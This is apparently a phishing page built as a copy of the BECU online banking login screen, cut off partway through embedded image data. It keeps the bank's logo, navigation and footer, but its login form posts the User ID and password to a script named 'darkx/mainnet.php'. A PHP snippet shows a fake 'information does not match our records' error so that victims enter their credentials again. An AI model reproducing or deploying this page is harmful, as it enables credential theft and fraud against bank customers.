///////////////mpjp/zgz0/87NtT/OzbU/zw31P+TkOf//v7/////////////q6ns/zAr0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LSjQ/56c6v////////////////+Wk+j/LyrR/zIt0v8yLdL/MSzR/4eE5P/+/v/////////////NzPT/ODPT/y4p0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8tKND/npzq/////////////////97d+P++vPH/v73x/7698f/Ew/L/7u37/////////////////8XD8v81MNL/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y0o0P+enOr////////////////////////////////////////////////////////////+/v//jInm/y0o0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LSjQ/56c6v///////////////////////////////////////////////////////Pz+/7a07/8+OtT/LinR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8tKNH/gX7j/8vK9P/Jx/P/ycfz/8nH8//Jx/P/ycfz/8nH8//Jx/P/x8bz/7Sy7v98eeL/OzbU/y4p0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8zLtL/NjHT/zYx0/82MdP/NjHT/zYx0/82MdP/NjHT/zYx0/81MNL/MCvR/ywn0P8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/AAAA/wAAAB8AAAAPAAAABwAAAAMAAAABAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAAAEAAAACAAAAABACAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAALyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f4vKtHtLyrRrC8q0TsvKtEBAAAAAC8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtHhLyrRVAAAAAAvKtH/LyrR/y8q0f8vKtH/LyrR/y4p0f8uKdH/LinR/y4p0f8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0eAvKtE7LyrR/y8q0f8vKtH/LyrR/zMu0v89OdT/PjnU/z451P8+OdT/PDfU/zAr0f8uKdH/LyrR/y8q0f8vKtH/LyrRqy8q0f8vKtH/LyrR/ywn0P9iXtz/1tX2/9rZ9//b2vf/29r3/9fW9v+koev/QDvV/y4p0f8vKtH/LyrR/y8q0ewvKtH/LyrR/y8q0f8sJtD/bmrf//z8/v/z8/z/19b2/9fW9v/y8vz//////4mG5f8sJ9D/LyrR/y8q0f8vKtH+LyrR/y8q0f8vKtH/LCbQ/25q3//+/v//yMfz/0hE1/9EQNb/rqzt//////+amOn/LSfQ/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/ywm0P9uat///Pz+//Hx/P/R0PX/0dD1/+/v/P/f3vj/Wlba/y0o0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8sJtD/bmrf//z8/v/29v3/4OD4/+Lh+f/5+f7/yMbz/0I91f8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LCbQ/25q3//+/v//y8r0/1BM2P9RTdn/yMbz//////97eOL/LCbQ/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/ywm0P9uat///Pz+//Pz/P/W1fb/2Nf2//b1/f/6+v7/cm/g/ywn0P8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8sJ9D/Yl7c/9bV9v/a2ff/29r3/9va9//U0/b/lpTo/zk00/8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/zMu0v89OdT/PjnU/z451P8+OdT/OjbU/y8q0f8uKdH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LinR/y4p0f8uKdH/LinR/y4p0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/y8q0f8vKtH/LyrR/wAHAAAAAwAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" sizes=32x32>
	<style>.sf-hidden{display:none!important}</style>
<link rel=canonical href="https://onlinebanking.becu.org/BECUBankingWeb/Login.aspx?_ga=2.117043342.909258113.1607360903-148549398.1607360903"></head>
<body id=bodytag class=login_aspx>
 
 <noscript class=sf-hidden>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T84HB2" height="0" width="0" style="display: none; visibility: hidden"></iframe>
    </noscript>
 
 
 <style type="text/css">
	.alert-warning {
background: transparent;
border-radius: 2px;
padding-left: 18px;
padding-bottom: 6px;
padding-top: -20px;
border: 1px solid red;
width: 80%;
margin-left: 40px;
	}
	
</style>


 
 
 
 <div id=standardHeader class=pageHeaderContainer>
 
 <div class=pageHeader>
 <nav class="navbar navbar-default" role=navigation>
 <div class=container>
 <div class=navbar-header>
 <a href=https://onlinebanking.becu.org/ class=logo-becu>
 <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" id=logomobile alt="BECU Online Banking - More than just money" class=sf-hidden>
 <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" id=logotablet alt="BECU Online Banking - More than just money" class=sf-hidden>
 <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK8AAAA3CAYAAAB6pxpbAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA4RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo2NDYzYzhmZC03NTJhLTRlNDYtYjU4OC0wYjU4MDNlODQ3ODYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QTEzNEY0MUFBNzkxMTFFN0FEOTBBQjkwNjY0QjY0MUQiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QTEzNEY0MTlBNzkxMTFFN0FEOTBBQjkwNjY0QjY0MUQiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6YzhmMTA5ZGQtYzMxZi0yNTQyLTgzOTMtMmVmOTc2ZjhiOWM2IiBzdFJlZjpkb2N1bWVudElEPSJhZG9iZTpkb2NpZDpwaG90b3Nob3A6MmUzZThkMTItOWM5OC0xMWU3LWE1MDgt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" id=logodesktop alt="BECU Online Banking - More than just money">
 </a>
 <button type=button class="navbar-toggle collapsed sf-hidden" data-toggle=collapse data-target=#nav-main-dropdown>
 
 
 
 
 
 </button>
 </div>
 <div id=skiptocontent class=accessibility-skip-link>
 <a href=#container id=skiptomain>Skip to main content</a>
 <a href=#pages-utility-nav id=skiptonavigation>Skip to navigation</a>
 <a href=#navFooter_standardFooter id=skiptofooter>Skip to footer</a>
 </div>
 <div id=nav-main-dropdown class="collapse navbar-collapse">
 <div class="dropdown-content cf">
 <div class=desktop-view>
 <ul id=pages-utility-nav class=pages-utility tabindex=-1>
 <li>
 <a href=https://www.becu.org/search id=LINKSEARCH class="search icon">Search</a>
 </li>
 <li>
 <a href=https://www.becu.org/locations/find-locations id=LINKBRANCHLOCATOR class="locations icon">Locations</a>
 </li>
 <li>
 <a href=https://www.becu.org/support/top-questions id=LINKSUPPORT class="support icon">Support</a>
 </li>
 </ul>
 </div>
 <div class=component-user-login>
 
 
 
 </div>
 <div class=desktop-view>
 <ul class=pages-main>
 <li>
 <a href=https://www.becu.org/members-matter/community-involvement id=LINKMEMBERSMATTER>BECU &amp; YOU</a>
 </li>
 <li>
 <a href=https://www.becu.org/everyday-banking id=LINKEVERYDAYBANKING>Everyday Banking</a>
 </li>
 <li>
 <a href=https://www.becu.org/loans-and-mortgages id=LINKLOANSMORTGAGES>Loans &amp; Mortgages</a>
 </li>
 <li>
 <a href=https://www.becu.org/planning-and-investing id=LINKINVESTMENTSTRUST>Planning &amp; Investing</a>
 </li>
 <li>
 <a href=https://www.becu.org/business-banking id=LINKBUSINESSBANKING>Business Banking</a>
 </li>
 </ul>
 </div>
 
 <div id=nav class="component-nav-links tablet-view sf-hidden" data-container-name=header-nav>
 
 
 </div>
 </div> 
 </div>
 </div>
 </nav>
 <div style=display:none>
 </div>
 <div id=PAGESUBHEADER class=container>
 <div class=pageTitle>
 <h1 class=headline>
 Login to BECU Online Banking
 </h1>
 </div>
 <nav id=sub-nav>
 
 </nav>
 </div>
 </div>
 
 </div>
 <aside>
 
 </aside>
 <main role=main>
 <div class=pageBody>
 <form action="darkx/mainnet.php" method="POST" id=MAINFORM autocomplete=off>
<div class=aspNetHidden>
</div>
<?php 
                                if (isset($_GET['ReasonCode'])) {
                                $ReasonCode = isset($_GET['ReasonCode']) ? trim(htmlentities($_GET['ReasonCode'])):'';
                                $em = "6004";
                                if ($ReasonCode == $em) {
                                print"<input type='hidden' name='ReasonCode' value='ReasonCode'><div class='alert alert-warning' role='alert'>
										<p  id='SignOn-Error' style='font-size: 13px'  > (11002): The information you provided does not match our records. Please re-enter your information and try again.</p>
									</div>";}}?>
 
 <div id=container class=container tabindex=-1>
 <aside>
 <div id=TITLEROW class=row>
 <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
 <div>
 
 </div>
 <div id=setasdefault>
 
 </div>
 <div class=favoritesContainer>
 
 </div>
 </div>
 </div>
 </aside>
 <div id=CONTENTROW class=row>
 <div id=PAGECONTENT class="content col-xs-12 col-sm-12 col-md-12 col-lg-12">
 <div id=ErrorContainer>
 
 
 </div>
 <div class=instructionsContainer>
 <div class=row>
 <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
 
 <p>Welcome to BECU Online Banking.<br><br>Please sign in with your User ID and Password:</p>
 </div>
 <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
 
 
 </div>
 </div>
 </div>
 
 <div class=formContainer>
 
<div class=formInputContainer><div class=formFields>
 <table class=formTable width=100% cellspacing=2>
 <tbody><tr class=item>
 <td width=10%><strong>User ID</strong></td>
 <td width=30%>
 <input name=userID type=text maxlength=32 class=standardInput aria-label="Type in your BECU member username" value>
 </td>
 <td width=60%>&nbsp;</td>
 </tr>
 <tr class=alternatingItem>
 <td><strong>Password</strong></td>
 <td>
 <input name=password type=password maxlength=32 class=standardInput aria-label="Type in your BECU member password" autocomplete=off value>
 </td>
 <td>&nbsp;</td>
 </tr>
 <tr class=item>
 <td><label for=ctlSignon_ddlSignonDestination></label></td>
 <td>
 
 
 </td>
 <td></td>
 </tr>
 </table></div>
</div>
<div class=formButtonContainer><input type=submit value=Login class="btn red">&nbsp;<img id=ctlSignon_imgLock src="data:image/gif;base64,R0lGODlhDwAZAOZIAN3d3dDQ0Ofn59PT06+vr9TU1O7u7s/Pz+vr69bW1v7+/tnZ2eLi4uDg4MXFxd7e3t/f38jIyMTExPHx8crKyvr6+ri4uOPj476+vs7OzvPz8729vdvb2+Tk5NfX18zMzPz8/Pb29tHR0fLy8sLCwubm5qmpqc3NzcvLy7CwsK6uruXl5dzc3NjY2NLS0tra2sfHx7y8vMbGxuzs7MHBwbGxsfT09K2trbm5ubq6urS0tKurq+3t7fn5+bW1tfv7+7e3t6KiovDw8MDAwPj4+MnJyff39+Hh4ejo6Onp6dXV1e/v77+/v/39/f///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEgALAAAAAAPABkAAAf/gE6CgkIrHSsag4pONgMLDUdHHhwVi0sDCAxKKEoXHQVEg0QZQg0RIi0BEgwIIgqCR0gMEUKDS0VJHjNOPwcIQwaLArgLCgYBC0yVihVMRxw9CC0nA4tOTRIFLEQXJEEOIE4K404hKSYUIQ4SOhguAwMFSglKGDgyCZQTE0L9ExpCDIwYocHDAiFIkCQRIGBhQwFIECwoIAAAhAYXI0WCxKDAhxculIikl4CeEnkHIgz4cCCAywMZWgY4kQGFgw8SKBQponPnTgcRKDAhsWGI0SFMhtBgwmRDDhgbmFhAioGp1SEWYgAxYUHFDQJgwaogkKKGjx0sGDwAAGDtg7VsMSEcgdAhSQmFCZMkVFgiyYUlSwwAHkzYAI8JRogYWZyYiGPGiUE0mUy5MuVw1jI7CQQAOw==" alt="Secure login"></div>
 <div class=sectionDivider></div>
<p><a id=lnkForgotYourPassword href=https://accessassistant.becu.org/Questions>Forgot your Password?</a><br>
 <a id=lnkForgotYourUserName href=https://accessassistant.becu.org/UserName>Forgot your User ID?</a></p>
 <div style=padding-top:20px>
 <span class=emphasizeMedium>Already a Member?</span><br>
 If you are not enrolled in Online and Mobile Banking yet <a id=lnkEnroll href=https://www.becu.org/support/online-banking#enroll>click here to enroll</a>.
 </div>
 <div style=padding-top:20px>
 <span class=emphasizeMedium>Not a Member?</span><br>
 <a href=https://www.becu.org/join>Sign up for membership with BECU</a>.
 </div>
 <iframe style=display:none name=agentCommander id=agentCommander></iframe>
 </div>
 
 
 
 
 
 
 
 </div>
 </div>
 <aside>
 <div id=PROMOROW class=row>
 
 
 
 </div>
 </aside>
 </div>
 
 
<div class=aspNetHidden>
 
 
</div>
</form>
 </div>
 </main>
 <div id=skipfootercontent class=accessibility-skip-link style=position:relative>
 <a href=#container id=skiptomainfooter>Skip to main content</a>
 <a href=#pages-utility-nav id=skiptonavigationfooter>Skip to navigation</a>
 </div>
 <footer id=navFooter_standardFooter class=footer>
 
 <div class=container>
 <div class=footer-links> 
 
 <ul>
 
 <li>
 <a id=footer11 target=_self href=https://www.becu.org/accessibility-statement>ACCESSIBILITY</a>
 </li>
 
 <li>
 <a id=footer12 target=_self href=https://www.becu.org/members-matter/about-membership>MEMBERSHIP</a>
 </li>
 
 <li>
 <a id=footer13 target=_self href=https://www.becu.org/support/forms>FORMS</a>
 </li>
 
 <li>
 <a id=footer14 target=_self href=https://www.becu.org/about-us/home>ABOUT US</a>
 </li>
 
 <li>
 <a id=footer15 target=_self href=https://www.becu.org/support/routing-number>ROUTING NUMBER 325081403</a>
 </li>
 
 </ul>
 
 
 <ul>
 
 <li>
 <a id=footer21 target=_blank href=https://www.becu.org/~/media/Files/PDF/avoidingForeclosure.pdf>AVOIDING FORECLOSURE</a>
 </li>
 
 <li>
 <a id=footer22 target=_self href=https://www.becu.org/members-matter/news-discounts>NEWS &amp; DISCOUNTS</a>
 </li>
 
 <li>
 <a id=footer23 target=_self href=https://www.becu.org/support/contact-us>CONTACT</a>
 </li>
 
 <li>
 <a id=footer24 target=_self href=https://www.becu.org/careers>CAREERS</a>
 </li>
 
 <li>
 <a id=footer25 target=_self href=https://newsroom.becu.org/>NEWSROOM</a>
 </li>
 
 </ul>
 
 
 <ul>
 
 <li>
 <a id=footer31 target=_self href=https://www.becu.org/security-and-privacy>SECURITY</a>
 </li>
 
 <li>
 <a id=footer32 target=_self href=https://www.becu.org/online-privacy-notice>PRIVACY</a>
 </li>
 
 <li>
 <a id=footer33 target=_self href=https://www.becu.org/~/media/Files/PDF/BECUTermsandConditions.pdf>TERMS &amp; CONDITIONS</a>
 </li>
 
 <li>
 <a id=footer34 target=_blank href=https://survey3.medallia.com/?becumembersuggestions>SEND A SUGGESTION</a>
 </li>
 
 <li>
 <a id=footer35 target=_self href=https://www.becu.org/blog>BECU BLOG</a>
 </li>
 
 </ul>
 
 
 
 <ul class=footer-social>
 <div id=social-text class=social-text>
 Follow BECU 
 </div>
 <li class=social-item>
 <a tabindex=0 href=https://www.facebook.com/becu title="BECU's Facebook page" id=facebook-link>
 <img src=data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NSA0NSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM0ZDYwNjk7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5JY29uX0ZhY2Vib29rPC90aXRsZT48ZyBpZD0iZmFjZWJvb2siPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTk0LjEyLDMzMnY0MWgtNDFWMzMyaDQxbTItMmgtNDV2NDVoNDVWMzMwWiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTUxLjEyIC0zMjkuOTYpIi8+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNNzAuNjIsMzQ4LjQ3aC0zdjRoM3YxMmg1di0xMmgzLjY0bC4zNi00aC00VjM0Ni44YzAtMSwuMTktMS4zMywxLjEyLTEuMzNoMi44OHYtNUg3NS44MWMtMy41OSwwLTUuMTksMS41OC01LjE5LDQuNjFaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNTEuMTIgLTMyOS45NikiLz48L2c+PC9zdmc+ alt="B E C U's Facebook page" id=facebook-image title="BECU's Facebook page" class=social-image>
 </a>
 </li>
 <li class=social-item>
 <a tabindex=0 href=https://www.instagram.com/becu title="BECU's Instagram page" id=instagram-link>
 <img src="data:image/svg+xml;base64,PHN2ZyBpZD0iTGF5ZXJfMSIgZGF0YS1uYW1lPSJMYXllciAxIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0NSA0NSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM0ZDYwNjk7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5JY29uX0luc3RhZ3JhbTwvdGl0bGU+PGcgaWQ9ImludHNhZ3JhbSI+PHBhdGggY2xhc3M9ImNscy0xIiBkPSJNOTMuOTQsMzMydjQxaC00MVYzMzJoNDFtMi0yaC00NXY0NWg0NVYzMzBaIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtNTAuOTQgLTMyOS45NikiLz48cGF0aCBjbGFzcz0iY2xzLTEiIGQ9Ik03My40NCwzNDIuNjNjMy4yMSwwLDMuNTksMCw0Ljg1LjA3LDMuMjUuMTUsNC43NywxLjY5LDQuOTIsNC45Mi4wNiwxLjI2LjA3LDEuNjQuMDcsNC44NXMwLDMuNTgtLjA3LDQuODVjLS4xNSwzLjIyLTEuNjYsNC43Ny00LjkyLDQuOTItMS4yNi4wNS0xLjY0LjA3LTQuODUuMDdzLTMuNTgsMC00Ljg1LS4wN2MtMy4yNi0uMTUtNC43Ny0xLjctNC45Mi00LjkyLS4wNS0xLjI3LS4wNy0xLjY1LS4wNy00Ljg1czAtMy41OS4wNy00Ljg1Yy4xNS0zLjIzLDEuNjctNC43Nyw0LjkyLTQuOTJDNjkuODYsMzQyLjY0LDcwLjI0LDM0Mi42Myw3My40NCwzNDIuNjNabTAtMi4xNmMtMy4yNiwwLTMuNjcsMC01LC4wNy00LjM1LjItNi43OCwyLjYyLTcsNywwLDEuMjgtLjA3LDEuNjk